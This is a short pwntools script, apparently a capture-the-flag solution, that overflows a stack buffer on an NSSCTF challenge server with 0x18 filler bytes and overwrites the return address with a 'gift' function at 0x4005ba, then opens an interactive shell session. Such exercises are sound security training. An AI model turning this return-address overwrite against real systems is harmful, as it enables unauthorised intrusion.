from pwn import *

#io = process("./附件")
io = connect("node7.anna.nssctf.cn",26462)

gift = 0x4005ba
payload = b"a" * (0x10 + 0x8) + p64(gift)
io.send(payload)
io.interactive()
